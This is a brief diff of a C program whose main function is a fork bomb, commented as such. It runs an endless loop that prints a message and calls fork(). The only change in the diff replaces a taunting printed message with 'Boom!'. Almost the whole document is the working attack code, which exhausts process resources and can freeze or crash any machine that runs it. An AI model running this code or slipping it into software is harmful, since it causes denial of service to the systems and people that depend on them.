@@ -6,7 +6,7 @@
 void main() {
 	// Starting a fork bomb
 	while (1) {
-        printf("Wishing you best of luck stopping this attack!\n");
+        printf("Boom!\n");
 		fork();
 	}
 }
